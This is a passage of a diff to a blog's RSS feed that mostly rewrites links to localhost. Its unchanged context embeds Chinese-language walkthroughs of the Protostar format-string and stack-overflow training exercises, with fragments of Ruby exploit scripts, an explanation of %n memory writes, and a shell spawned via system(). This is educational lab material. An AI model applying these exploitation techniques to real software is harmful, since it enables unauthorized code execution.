 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_1/end.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_1/end.png&#34;
 	width=&#34;2874&#34;
 	height=&#34;1162&#34;
-	srcset=&#34;/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_480x0_resize_box_3.png 480w, /p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1230,10 +1230,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>Protostar Format 0-4 Walkthrough</title>
-        <link>/p/protostar_format_0-4/</link>
+        <link>//localhost:1313/p/protostar_format_0-4/</link>
         <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_format_0-4/</guid>
+        <guid>//localhost:1313/p/protostar_format_0-4/</guid>
         <description>&lt;p&gt;所有的 ruby 脚本已经放在了&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -1300,10 +1300,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;唯一需要说明的就是 &lt;code&gt;%64d&lt;/code&gt; 的作用是对 &lt;code&gt;char buffer[64]&lt;/code&gt; 填充 64 个空格进行占位&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/0.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/0.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;624&#34;
-	srcset=&#34;/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1314,7 +1314,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-one&#34;&gt;Format One&lt;/h2&gt;
-&lt;p&gt;由于比较奇怪所以放在了&lt;a class=&#34;link&#34; href=&#34;/p/protostar_format_1&#34; &gt;这里&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;由于比较奇怪所以放在了&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_format_1&#34; &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-two&#34;&gt;Format Two&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -1366,10 +1366,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;%60x&lt;/code&gt; 打印 60 个 bytes&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;%4$n&lt;/code&gt; 选取第 4 个参数（也就是上面说 ABCD 出现在第 4 个 &lt;code&gt;%08x&lt;/code&gt;）写入「当前打印了多少字符」&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/2.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/2.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;458&#34;
-	srcset=&#34;/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1449,10 +1449,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/3.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/3.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;492&#34;
-	srcset=&#34;/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1562,10 +1562,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;所以只能换成 &lt;code&gt;system(command)&lt;/code&gt; 了&lt;/p&gt;
 &lt;p&gt;顺带一提 &lt;code&gt;puts `#{command}` &lt;/code&gt; 的 Markdown 语法是&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;``puts &lt;span class=&#34;sb&#34;&gt;`#{command}`&lt;/span&gt; ``
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/4.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/4.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;888&#34;
-	srcset=&#34;/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1578,10 +1578,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>Protostar Stack 0-7 Walkthrough</title>
-        <link>/p/protostar_stack_4-7/</link>
+        <link>//localhost:1313/p/protostar_stack_4-7/</link>
         <pubDate>Tue, 22 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_stack_4-7/</guid>
+        <guid>//localhost:1313/p/protostar_stack_4-7/</guid>
         <description>&lt;p&gt;所有的 python 脚本已经放在了&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -1687,7 +1687,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;23461&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2011&lt;/span&gt; stack7
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h2 id=&#34;stack-zero--three&#34;&gt;Stack Zero ~ Three&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_stack_0-3&#34; &gt;☞ 为了避免太长就被隐藏在这里了x&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_stack_0-3&#34; &gt;☞ 为了避免太长就被隐藏在这里了x&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;stack-four&#34;&gt;Stack Four&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -2177,10 +2177,10 @@ $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ecffb0 &amp;lt;__libc_sy
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;为什么就没有了呢，怎么会是呢&lt;/p&gt;
 &lt;p&gt;实际上确实已经有一个 &lt;code&gt;/bin/sh&lt;/code&gt; 生成了，可是还什么都没输入就退出了&lt;/p&gt;
 &lt;p&gt;这时候可以使用 cat&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_stack_4-7/cat.jpeg&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_stack_4-7/cat.jpeg&#34;
 	width=&#34;201&#34;
 	height=&#34;251&#34;
-	srcset=&#34;/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_480x0_resize_q75_box.jpeg 480w, /p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_1024x0_resize_q75_box.jpeg 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_480x0_resize_q75_box.jpeg 480w, //localhost:1313/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_1024x0_resize_q75_box.jpeg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
